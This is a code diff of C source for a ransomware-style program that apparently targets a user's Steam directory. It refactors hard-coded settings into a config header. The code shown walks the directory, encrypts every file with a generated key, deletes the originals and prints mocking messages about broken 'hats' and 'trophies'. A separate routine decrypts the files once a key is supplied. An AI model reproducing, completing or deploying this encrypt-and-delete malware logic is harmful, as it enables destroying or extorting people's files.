@@ -6,17 +6,13 @@
 
 #include "aes.h"
 #include "ccard.h"
+#include "config.h"
 #include "etc.h"
 #include "filecrypt.h"
 #include "fslist.h"
 #include "rsa.h"
 #include "rsa_io.h"
 
-#ifndef CRYPTDIR
-#define CRYPTDIR		"local/share/Steam"
-#endif
-
-#define ENCEXT			".enc"
 #define PUBFILE			"enc_key.bin"
 #define SECFILE			"dec_key.bin"
 
@@ -43,15 +39,15 @@ static int enc_dir(const char *basedir, const uint8_t *key) {
 	size_t i;
 	char *infile, outfile[PATH_MAX];
 
-	printf("Scanning '%s' for possible frobnications...\n", CRYPTDIR);
+	printf("Scanning '%s' for possible frobnications...\n", CONFIG_CRYPTDIR);
 	
 	if((list = fslist_scan(basedir)) == 0) return 0;
 
 	for(i = 0; i < list->n; i++) {
 		infile = list->filename[i];
 		printf(" - %s\n", infile);
-		snprintf(outfile, PATH_MAX, "%s%s", infile, ENCEXT);
-		if(!hasext(infile, ENCEXT) ) {
+		snprintf(outfile, PATH_MAX, "%s%s", infile, CONFIG_CRYPTED_EXT);
+		if(!hasext(infile, CONFIG_CRYPTED_EXT) ) {
 			file_enc(infile, outfile, key);
 			remove(infile);
 		}
@@ -68,7 +64,7 @@ static int dec_dir(const char *basedir, const uint8_t *key) {
 	size_t i;
 	char *infile, outfile[PATH_MAX];
 
-	printf("Scanning '%s' for trading cards...\n", CRYPTDIR);
+	printf("Scanning '%s' for trading cards...\n", CONFIG_CRYPTDIR);
 	
 	if((list = fslist_scan(basedir)) == 0) return 0;
 
@@ -76,9 +72,9 @@ static int dec_dir(const char *basedir, const uint8_t *key) {
 		infile = list->filename[i];
 		printf(" - %s\n", infile);
 		strncpy(outfile, infile, PATH_MAX);
-		outfile[strlen(infile) - strlen(ENCEXT)] = '\0';
+		outfile[strlen(infile) - strlen(CONFIG_CRYPTED_EXT)] = '\0';
 	
-		if(hasext(infile, ENCEXT)) {
+		if(hasext(infile, CONFIG_CRYPTED_EXT)) {
 			file_dec(infile, outfile, key);
 			remove(infile);
 		}
@@ -96,7 +92,7 @@ static rsa_keypair_t *local_pubkey(uint8_t **serialized, size_t *len) {
 	uint8_t *backup;
 	FILE *backupfp;
 
-	if((pair = rsa_keypair_gen(KEYSIZE, &status)) == NULL) return NULL;
+	if((pair = rsa_keypair_gen(CONFIG_RSA_KSIZE, &status)) == NULL) return NULL;
 	if((backup = rsa_serialize_pair(pair, len)) == NULL) goto freepair;
 	if((backupfp = fopen("backup.bin", "wb")) == NULL) goto freebackup;
 	if(fwrite(backup, *len, 1, backupfp) == 0) goto closefp;
@@ -263,7 +259,7 @@ int main(void) {
 				return EXIT_FAILURE;
 			}
 
-			enc_dir(CRYPTDIR, sym_key);
+			enc_dir(CONFIG_CRYPTDIR, sym_key);
 			free(sym_key);
 		case 1:
 			printf("Oh noes! I accidentally on all your hats and broke your trophies. :/\n");
@@ -286,7 +282,7 @@ int main(void) {
 				break;
 			}
 			printf("YAY! It worked! :D Let me upgrade your DLC...\n\n");
-			dec_dir(CRYPTDIR, sym_key);
+			dec_dir(CONFIG_CRYPTDIR, sym_key);
 			free(sym_key);
 
 			break;
